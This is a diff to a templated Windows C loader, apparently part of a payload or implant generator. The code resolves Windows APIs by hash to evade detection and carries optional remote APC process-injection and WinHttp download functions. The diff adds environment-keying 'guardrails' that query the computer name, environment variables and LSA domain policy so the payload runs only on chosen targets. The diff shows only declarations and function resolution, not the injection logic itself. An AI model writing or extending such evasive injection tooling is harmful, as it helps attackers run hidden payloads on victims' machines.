@@ -21,9 +21,12 @@ typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
 typedef DWORD (WINAPI *pSleepEx)(DWORD, BOOL);
-{% if execution_method == 'remoteapc' %}
+typedef BOOL (WINAPI *pGetComputerNameA)(LPSTR, LPDWORD);
+{% if execution_method == 'remoteapc' or guardrails_needed %}
 typedef int (WINAPI* pLstrlenA)(LPCSTR);
 typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
+{% endif %}
+{% if execution_method == 'remoteapc' %}
 typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
@@ -54,6 +57,12 @@ typedef BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTSW
 typedef BOOL (WINAPI *pWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
 typedef BOOL (WINAPI *pWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
 {% endif %}
+{% if guardrails_needed %}
+typedef NTSTATUS (WINAPI *pLsaOpenPolicy)(PLSA_UNICODE_STRING, PLSA_OBJECT_ATTRIBUTES, ACCESS_MASK, PLSA_HANDLE);
+typedef NTSTATUS (WINAPI *pLsaQueryInformationPolicy)(LSA_HANDLE, POLICY_INFORMATION_CLASS, PVOID*);
+typedef NTSTATUS (WINAPI *pLsaFreeMemory)(PVOID);
+typedef NTSTATUS (WINAPI *pLsaClose)(LSA_HANDLE);
+{% endif %}
 
 // --- 2. Declare global variables to hold the resolved function pointers ---
 pLoadLibraryA pfnLoadLibraryA;
@@ -77,9 +86,12 @@ pReadFile pfnReadFile;
 pRtlMoveMemory pfnRtlMoveMemory;
 pRtlZeroMemory pfnRtlZeroMemory;
 pSleepEx pfnSleepEx;
-{% if execution_method == 'remoteapc' %}
+pGetComputerNameA pfnGetComputerNameA;
+{% if execution_method == 'remoteapc' or guardrails_needed %}
 pLstrlenA pfnLstrlenA;
 pGetEnvironmentVariableA pfnGetEnvironmentVariableA;
+{% endif %}
+{% if execution_method == 'remoteapc' %}
 pCreateProcessA pfnCreateProcessA;
 pVirtualAllocEx pfnVirtualAllocEx;
 pWriteProcessMemory pfnWriteProcessMemory;
@@ -109,6 +121,12 @@ pWinHttpCloseHandle pfnWinHttpCloseHandle;
 pWinHttpCrackUrl pfnWinHttpCrackUrl;
 pWinHttpSetOption pfnWinHttpSetOption;
 pWinHttpQueryHeaders pfnWinHttpQueryHeaders;
+{% endif %}
+{% if guardrails_needed %}
+pLsaOpenPolicy pfnLsaOpenPolicy;
+pLsaQueryInformationPolicy pfnLsaQueryInformationPolicy;
+pLsaFreeMemory pfnLsaFreeMemory;
+pLsaClose pfnLsaClose;
 {% endif %}
 
 // --- 3. Hashing and Resolution Functions ---
@@ -185,6 +203,9 @@ void ResolveAPIs() {
     DWORD NTDLL_HASH = {{ hash_ntdll_dll }};
     DWORD CABINET_HASH = {{ hash_cabinet_dll }};
     DWORD WINHTTP_HASH = {{ hash_winhttp_dll }};
+    {% if guardrails_needed %}
+    DWORD ADVAPI32_HASH = {{ hash_advapi32_dll }};
+    {% endif %}
 
     HMODULE hKernel32 = GetModuleHandleByHash(KERNEL32_HASH);
     HMODULE hNtdll = GetModuleHandleByHash(NTDLL_HASH);
@@ -211,9 +232,12 @@ void ResolveAPIs() {
         pfnNtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressByHash(hNtdll, {{ hash_ntmapviewofsection }});
     }
 
-    {% if execution_method == 'remoteapc' %}
+    {% if execution_method == 'remoteapc' or guardrails_needed %}
     pfnLstrlenA = (pLstrlenA)GetProcAddressByHash(hKernel32, {{ hash_lstrlena }});
     pfnGetEnvironmentVariableA = (pGetEnvironmentVariableA)GetProcAddressByHash(hKernel32, {{ hash_getenvironmentvariablea }});
+    {% endif %}
+
+    {% if execution_method == 'remoteapc' %}
     pfnCreateProcessA = (pCreateProcessA)GetProcAddressByHash(hKernel32, {{ hash_createprocessa }});
     pfnVirtualAllocEx = (pVirtualAllocEx)GetProcAddressByHash(hKernel32, {{ hash_virtualallocex }});
     pfnWriteProcessMemory = (pWriteProcessMemory)GetProcAddressByHash(hKernel32, {{ hash_writeprocessmemory }});
@@ -260,6 +284,21 @@ void ResolveAPIs() {
         pfnWinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddressByHash(hWinHttp, {{ hash_winhttpcrackurl }});
         pfnWinHttpSetOption = (pWinHttpSetOption)GetProcAddressByHash(hWinHttp, {{ hash_winhttpsetoption }});
         pfnWinHttpQueryHeaders = (pWinHttpQueryHeaders)GetProcAddressByHash(hWinHttp, {{ hash_winhttpqueryheaders }});
+    }
+    {% endif %}
+
+    {% if guardrails_needed %}
+    pfnGetComputerNameA = (pGetComputerNameA)GetProcAddressByHash(hKernel32, {{ hash_getcomputernamea }});
+    
+    HMODULE hAdvApi32 = GetModuleHandleByHash(ADVAPI32_HASH);
+    if (hAdvApi32 == NULL && pfnLoadLibraryA != NULL) { 
+        hAdvApi32 = pfnLoadLibraryA("advapi32.dll"); 
+    }
+    if (hAdvApi32 != NULL) {
+        pfnLsaOpenPolicy = (pLsaOpenPolicy)GetProcAddressByHash(hAdvApi32, {{ hash_lsaopenpolicy }});
+        pfnLsaQueryInformationPolicy = (pLsaQueryInformationPolicy)GetProcAddressByHash(hAdvApi32, {{ hash_lsaqueryinformationpolicy }});
+        pfnLsaFreeMemory = (pLsaFreeMemory)GetProcAddressByHash(hAdvApi32, {{ hash_lsafreememory }});
+        pfnLsaClose = (pLsaClose)GetProcAddressByHash(hAdvApi32, {{ hash_lsaclose }});
     }
     {% endif %}
 
